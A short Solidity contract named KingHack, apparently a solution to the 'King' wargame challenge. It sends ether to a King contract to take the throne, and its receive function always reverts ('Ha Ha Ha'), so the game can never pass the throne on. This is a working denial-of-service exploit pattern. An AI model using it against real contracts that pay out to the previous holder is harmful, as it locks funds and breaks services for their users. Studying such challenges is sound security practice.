// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../king/King.sol";

contract KingHack {
    function sendPayment(address king) external payable {
        payable(king).transfer(msg.value);
    }

    receive () external payable {
        require(!true, "Ha Ha Ha");
    }
}
